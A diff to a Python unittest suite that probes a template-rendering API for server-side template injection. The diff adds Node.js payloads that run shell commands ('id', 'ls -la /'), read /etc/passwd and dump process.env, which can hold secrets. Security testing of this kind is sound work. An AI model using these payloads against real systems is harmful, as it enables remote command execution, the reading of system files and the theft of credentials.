@@ -13,10 +13,13 @@ import logging
 
 # Configure logging
 logging.basicConfig(
-    level=logging.DEBUG,
-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
+    level=logging.INFO,
+    format='%(message)s'  # Simplified format
 )
 logger = logging.getLogger(__name__)
+
+# Disable noisy loggers
+logging.getLogger('urllib3').setLevel(logging.WARNING)
 
 # Load environment variables
 load_dotenv()
@@ -169,15 +172,31 @@ class TestSSTI(unittest.TestCase):
         """Test code execution via template"""
         marker = str(uuid.uuid4())
         
-        # Test command execution
+        # Test basic command execution first
+        template = f'${{(() => require("child_process").execSync("echo {marker}").toString())()}}'
+        logger.info(f"Testing basic command execution with template: {template}")
+        
         response = self._make_request('POST', f"{API_URL}/api/template/render", json={
-            'template': f'${{(() => require("child_process").execSync("echo {marker}").toString())()}}',
+            'template': template,
             'data': {}
         })
         self.assertEqual(response.status_code, 200)
         result = response.json()['result']
-        logger.info(f"Command execution result: {result}")
+        logger.info(f"Basic command result: {result}")
         self.assertIn(marker, result)
+        
+        # Test user context with 'id' command
+        template = '${(() => require("child_process").execSync("id").toString())()}'
+        logger.info(f"Testing user context with template: {template}")
+        
+        response = self._make_request('POST', f"{API_URL}/api/template/render", json={
+            'template': template,
+            'data': {}
+        })
+        self.assertEqual(response.status_code, 200)
+        result = response.json()['result']
+        logger.info(f"User context:\n{result}")
+        self.assertIn('uid=', result)  # Verify we got id command output
         
         # Test process info access
         response = self._make_request('POST', f"{API_URL}/api/template/render", json={
@@ -191,36 +210,17 @@ class TestSSTI(unittest.TestCase):
     
     def test_04_file_system_access(self):
         """Test file system access via template"""
-        test_content = str(uuid.uuid4())
-        test_file = "/tmp/test_ssti.txt"
-        logger.info(f"Testing file system access with content: {test_content}")
+        # Test reading sensitive file (/etc/passwd)
+        logger.info("Testing sensitive file read access")
         
-        try:
-            # Create test file through template
-            response = self._make_request('POST', f"{API_URL}/api/template/render", json={
-                'template': f'${{(() => {{ require("fs").writeFileSync("{test_file}", "{test_content}"); return "ok"; }})()}}',
-                'data': {}
-            })
-            self.assertEqual(response.status_code, 200)
-            logger.info(f"File creation response: {response.json()['result']}")
-            
-            # Test file reading
-            response = self._make_request('POST', f"{API_URL}/api/template/render", json={
-                'template': f'${{(() => require("fs").readFileSync("{test_file}", "utf8"))()}}',
-                'data': {}
-            })
-            self.assertEqual(response.status_code, 200)
-            result = response.json()['result']
-            logger.info(f"File content read: {result}")
-            self.assertIn(test_content, result)
-            
-        finally:
-            # Cleanup through template
-            response = self._make_request('POST', f"{API_URL}/api/template/render", json={
-                'template': f'${{(() => {{ require("fs").unlinkSync("{test_file}"); return "ok"; }})()}}',
-                'data': {}
-            })
-            logger.info(f"File cleanup response: {response.json()['result']}")
+        response = self._make_request('POST', f"{API_URL}/api/template/render", json={
+            'template': '${(() => require("fs").readFileSync("/etc/passwd", "utf8"))()}',
+            'data': {}
+        })
+        self.assertEqual(response.status_code, 200)
+        result = response.json()['result']
+        logger.info(f"File contents:\n{result}")
+        self.assertIn('root:', result)  # Verify we got /etc/passwd contents
     
     # def test_05_network_access(self):
     #     """Test network access via template"""
@@ -244,30 +244,38 @@ class TestSSTI(unittest.TestCase):
     #     if not result.startswith('Error:'):
     #         self.assertIn(self.test_marker, result)
     
-    def test_06_template_syntax(self):
-        """Test different template syntax variations"""
-        test_value = str(uuid.uuid4())
+    def test_06_sensitive_data_access(self):
+        """Test accessing sensitive application data"""
+        logger.info("Testing access to sensitive information")
         
-        variations = [
-            (f'${{(() => "{test_value}")()}}', "Standard"),
-            (f'${{(() => `{test_value}`)()}}', "Template literal"),
-            (f'${{(() => "{test_value}")()}}', "Arrow function"),
-            (f'${{(() => JSON.stringify({{value: "{test_value}"}})())}}', "Object stringification"),
-            (f'${{(() => Buffer.from("{test_value}").toString("base64"))()}}', "Buffer manipulation")
-        ]
+        # Read Node.js process info
+        response = self._make_request('POST', f"{API_URL}/api/template/render", json={
+            'template': '${(() => JSON.stringify({env: process.env, version: process.version, arch: process.arch, platform: process.platform}))()}',
+            'data': {}
+        })
+        self.assertEqual(response.status_code, 200)
+        result = response.json()['result']
+        logger.info(f"Node.js process info:\n{result}")
         
-        for payload, description in variations:
-            response = self._make_request('POST', f"{API_URL}/api/template/render", json={
-                'template': payload,
-                'data': {}
-            })
-            self.assertEqual(response.status_code, 200, f"Failed on {description}")
-            result = response.json()['result']
-            if description != "Buffer manipulation":
-                self.assertIn(test_value, result, f"Failed on {description}")
-            else:
-                decoded = base64.b64decode(result).decode()
-                self.assertEqual(decoded, test_value, f"Failed on {description}")
+        # List root directory
+        response = self._make_request('POST', f"{API_URL}/api/template/render", json={
+            'template': '${(() => require("child_process").execSync("ls -la /").toString())()}',
+            'data': {}
+        })
+        self.assertEqual(response.status_code, 200)
+        result = response.json()['result']
+        logger.info(f"\nRoot directory contents:\n{result}")
+        
+        # Get memory info
+        response = self._make_request('POST', f"{API_URL}/api/template/render", json={
+            'template': '${(() => require("child_process").execSync("free -m").toString())()}',
+            'data': {}
+        })
+        self.assertEqual(response.status_code, 200)
+        result = response.json()['result']
+        logger.info(f"\nMemory information:\n{result}")
+        
+        self.assertTrue(len(result) > 0)
 
 if __name__ == '__main__':
     unittest.main() 
